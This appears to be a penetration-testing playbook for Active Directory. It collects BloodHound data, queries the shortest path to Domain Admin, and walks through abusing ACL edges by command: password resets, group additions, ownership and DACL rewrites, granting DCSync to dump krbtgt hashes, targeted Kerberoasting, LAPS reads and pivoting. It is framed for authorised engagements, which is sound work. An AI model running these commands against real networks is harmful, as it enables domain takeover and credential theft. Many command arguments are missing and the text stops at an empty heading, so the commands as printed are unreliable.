> Purpose: collect AD relationship data once, then use it to answer a single question — what is the shortest path from a principal I control to Domain Admin? — and exploit the first edge on that path. ## Collection options | Collector | Run from | Best when | Output | | --- | --- | --- | --- | | bloodhound-python | Kali | you have domain credentials and can reach the DC | JSON files | | nxc ldap --bloodhound | Kali | one command, no Python dependency | JSON files | | SharpHound.exe | Windows host | you are already on a domain-joined box; richest session data | ZIP | All three produce the same graph. Collect once per engagement; re-collecting after every change wastes time. ## A. Collection ### Step 01 — Collect with bloodhound-python Priority: Core · Run on: Kali · Status: Syntax Checked ```bash bloodhound-python -u -p -d -ns -c All ``` Look for: INFO: Found AD domain, INFO: Done in 00M 42S, and a set of .json files in the current directory.
Decision: collection completes → Step 04. DNS errors → add -dc or point -ns at the DC. Access denied on sessions → Step 02 or -c DCOnly.
Next: Step 04.
Common mistake: running with -c All from a host that cannot reach every member server — session collection fails and you waste minutes. Use -c DCOnly for a fast, reliable baseline, then add Session later.
Evidence: the JSON file list and the collector's log. ### Step 02 — Collect with NetExec Priority: Core · Run on: Kali · Status: Syntax Checked ```bash nxc ldap -u -p --bloodhound -c All ``` Look for: BloodHound in the nxc output and JSON files written to the working directory.
Decision: works → Step 04. LDAP signing or channel binding errors → use LDAPS or fall back to Step 01.
Next: Step 04.
Common mistake: forgetting -c All — without it you may get only a partial collection.
Evidence: the nxc output and the resulting files. ### Step 03 — Collect with SharpHound (Windows) Priority: Conditional · Run on: target Windows host · Status: Documented ```shen SharpHound.exe -c All --zipfilename loot.zip SharpHound.exe -c DCOnly --zipfilename dc.zip ``` Look for: loot.zip in the current directory.
Decision: AV removes SharpHound → use bloodhound-python from Kali instead of fighting the AV.
Next: transfer the ZIP to Kali and Step 04.
Common mistake: running -c All from a workstation with no privileges — session collection is noisy and may be blocked by the domain. DCOnly is safer for a first pass.
Evidence: the ZIP filename and collection log. ### Step 04 — Verify and import Priority: Core · Run on: Kali · Status: Syntax Checked ```bash ls -la *.json *.zip 2>/dev/null python3 -c "import json,glob; [print(f, len(json.load(open(f))['data'])) for f in glob.glob('*_users.json')]" sudo neo4j start bloodhound --no-sandbox ``` Look for: a non-trivial user/computer count, then a successful import in the BloodHound GUI (Database Info shows the domain).
Decision: counts look sane → Step 05. Empty or tiny counts → re-collect (Step 01) with the DC as -dc.
Next: Step 05.
Common mistake: importing a ZIP that contains only computers.json. Check that users, groups and gpos are present before trusting the graph.
Evidence: the file list and the database info panel. ## B. Querying ### Step 05 — Shortest path to Domain Admin Priority: Core · Run on: Kali (BloodHound UI) · Status: Syntax Checked ```javascript MATCH p=shortestPath((u:User {name:"@"})-[*1..]->(g:Group {name:"DOMAIN ADMINS@"})) RETURN p ``` Look for: a path of 2-6 hops; the edges are the exploitation steps.
Decision: a path exists → read the first edge from your user and go to Section C. No path → check Domain Users → Domain Admins via nested groups, and re-collect.
Next: Section C.
Common mistake: reading the whole path and trying to exploit the last hop. You must walk it in order, starting from the only principal you control.
Evidence: a screenshot of the path with the edge labels. ### Step 06 — Mark what you own Priority: Core · Run on: Kali (BloodHound UI) · Status: Syntax Checked Right-click the principal you control → Mark as Owned. Then re-run Step 05; owned nodes get a skull and shortcut the analysis. Look for: every credential you have collected marked owned — users, computers, and groups.
Decision: multiple owned principals → query the shortest path from any owned node: ```javascript MATCH p=shortestPath((o {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@"})) RETURN p ``` Next: Section C.
Common mistake: marking only the first user. The account you got from a share may be the better starting point.
Evidence: the owned-node list. ### Step 07 — High-value queries Priority: Core · Run on: Kali (BloodHound UI) · Status: Syntax Checked ```javascript MATCH (u:User {hasspn:true}) RETURN u.name MATCH (u:User {dontreqpreauth:true}) RETURN u.name MATCH (c {unconstraineddelegation:true}) RETURN c.name MATCH (u:User)-[:HasSession]->(c:Computer) WHERE u.admincount=true RETURN u.name, c.name MATCH p=(a)-[:GenericAll|GenericWrite|WriteOwner|WriteDacl|ForceChangePassword]->(b) RETURN p ``` Look for: Kerberoastable service accounts, AS-REP roastable users, unconstrained delegation hosts, and DA sessions on member servers.
Decision: an ACL edge from an owned principal → Section C. A DA session → target that computer with the credential you hold.
Next: Section C or lateral movement.
Common mistake: chasing a Kerberoastable account with no path to DA. Check the path first, then crack.
Evidence: the query results. ## C. Exploiting the edges ### Step 08 — ForceChangePassword Priority: Core · Run on: Kali · Status: Syntax Checked ```bash net rpc password "" -U "/%" -S # alternative, if net rpc is unavailable impacket-changepasswd -altuser '/' -altpass '' -reset -newpass '' '/'@ ``` Look for: Password changed or a successful bind.
Decision: success → authenticate as and re-run Step 05 with the new owned node.
Next: Step 06.
Common mistake: changing a password that is in use by a service or a live session, breaking the box. Prefer accounts the path needs, not critical service accounts.
Evidence: the command and the successful authentication as the target. ### Step 09 — GenericAll on a user Priority: Core · Run on: Kali · Status: Syntax Checked GenericAll on a user includes the right to reset their password — same action as Step 08, with no extra tooling. Use the command below; it is the Step 08 reset. ```bash # GenericAll includes ResetPassword: this is the Step 08 command, reused net rpc password "" -U "/%" -S ``` Look for: Password changed, then a fresh login as .
Decision: reset succeeds → you own the target; re-run Step 05 and mark the new account owned. If the target is a DA, stop and collect proof.
Next: Step 06 (re-mark owned and re-collect) or Step 08 if the reset is refused.
Common mistake: assuming GenericAll always means "take over the account immediately". Check whether the account is Account is sensitive and cannot be delegated or protected by AdminSDHolder.
Evidence: the ACL edge, the reset, and the login. ### Step 10 — AddMember / GenericAll on a group Priority: Core · Run on: Kali · Status: Syntax Checked ```bash net rpc group addmem "" "" -U "/%" -S ``` Look for: no error, then group membership confirmed with net rpc group members.
Decision: works → re-collect or refresh BloodHound; your new group may open a path.
Next: Step 05 again.
Common mistake: adding yourself to Domain Admins when the edge is on a lesser group — read the edge target. Adding to a privileged group is loud; do it only when it is the path.
Evidence: the membership before and after. ### Step 11 — WriteOwner Priority: Core · Run on: Kali · Status: Syntax Checked ```bash impacket-owneredit -action write -new-owner '' -target '' -dc-ip '/:' impacket-dacledit -action write -rights FullControl -principal '' -target '' -dc-ip '/:' ``` Look for: Owner changed then DACL modified — you are now owner and have FullControl, which turns WriteOwner into GenericAll.
Decision: owneredit succeeds but dacledit fails → grant yourself only the specific right you need (e.g. ResetPassword).
Next: Step 08 or Step 10 depending on the target type.
Common mistake: stopping after taking ownership. Ownership alone gives you the ability to change the DACL — you still have to do it.
Evidence: the ACL before/after and the action that followed. ### Step 12 — WriteDACL to DCSync Priority: Advanced · Run on: Kali · Status: Documented ```bash impacket-dacledit -action write -rights DCSync -principal '' -target-dn 'DC=,DC=' -dc-ip '/:' impacket-secretsdump -just-dc-ntlm /:@ ``` Look for: DACL modified then the krbtgt hash from secretsdump.
Decision: DCSync rights granted → you have domain-wide credential access. This is the end of the chain.
Next: pass-the-hash or golden ticket (advanced).
Common mistake: writing DCSync on the wrong object. The target must be the domain root (DC=…), not a user.
Evidence: the DACL change and the dump. ### Step 13 — GenericWrite (targeted Kerberoast or logon script) Priority: Advanced · Run on: Kali / Windows · Status: Environment Dependent GenericWrite lets you set a servicePrincipalName on the target user, making it Kerberoastable, then crack the ticket offline. It can also point scriptPath at a file you control. ```bash # set an SPN, then roast (bloodyAD or PowerView on Windows) # bloodyAD is not installed on this host: use PowerView from a Windows session impacket-GetUserSPNs /: -dc-ip -request -outputfile kerb.txt ``` Prerequisites: writing the servicePrincipalName needs bloodyAD (pipx install bloodyAD) or PowerView from a Windows session — bloodyAD is not installed on the build host used for this audit, which is why this step is Environment Dependent. The roast itself uses impacket-GetUserSPNs, which is present on Kali.
Look for: a $krb5tgs$ hash for the target account.
Decision: crack succeeds → you own the target without changing its password (quieter).
Next: authenticate as the target.
Common mistake: setting an SPN that collides with an existing one — the write fails or breaks a service.
Evidence: the modified attribute and the roasted ticket. ### Step 14 — ReadLAPSPassword and gMSA Priority: Conditional · Run on: Kali · Status: Documented If BloodHound shows ReadLAPSPassword on a computer, the local admin password is stored in ms-Mcs-AdmPwd and readable with that right. ```bash nxc ldap -u -p -d --laps ``` Look for: a plaintext local administrator password per computer.
Decision: password returned → use it locally (--local-auth) on that host.
Next: local admin → Post-Exploitation page.
Common mistake: assuming LAPS is deployed everywhere. The edge must exist in BloodHound first.
Evidence: the retrieved password (redacted) and the host it belongs to. ## D. Decision tree | What BloodHound shows | Do this | Do not | | --- | --- | --- | | Shortest path from owned to DA | Exploit the first edge (Section C) | Jump to the last hop | | ForceChangePassword / GenericAll on user | Reset password (Step 08/09) | Crack anything | | AddMember on a group | Add your user (Step 10) | Add to Domain Admins unless it is the path | | WriteOwner | owneredit → dacledit (Step 11) | Stop after taking ownership | | WriteDacl on the domain | Grant DCSync (Step 12) | Grant FullControl to everything | | GenericWrite on a user | Targeted Kerberoast (Step 13) | Change the password loudly | | ReadLAPSPassword | Read LAPS (Step 14) | Assume local admin everywhere | | DA session on a member server | Target that host | Attack the DC first | | No path at all | Re-collect with -c All; check nested groups | Conclude "AD is hardened" from one collection | ## E. Troubleshooting | Symptom | Cause | Fix | | --- | --- | --- | | Could not resolve | DNS pointed at Kali | -ns or -dc | | Collection hangs on sessions | Member servers unreachable | -c DCOnly | | LDAP signing required | DC policy | Use LDAPS or SharpHound from Windows | | BloodHound shows no data | Import failed / wrong ZIP | Check the JSON counts before import | | Neo4j will not start | Java or stale lock | sudo neo4j start; check neo4j status | | No shortest path | Data stale or path needs a credential you do not have | Re-collect; check owned nodes | | owneredit insufficient access | You do not actually have WriteOwner | Verify the edge and the object | | dacledit could not modify | Inheritance/protected object | Try the specific right, or AdminSDHolder path | Pivoting variant. Through a pivot, BloodHound collection needs DNS and LDAP to the DC: ```bash proxychains4 bloodhound-python -u -p -d -ns --dns-tcp -c DCOnly proxychains4 nxc ldap -u -p --bloodhound -c All ``` Proxychains carries TCP only, so UDP DNS fails — add --dns-tcp or use IPs. If session collection must reach many hosts, run SharpHound from a compromised Windows host inside the network instead. ## F.
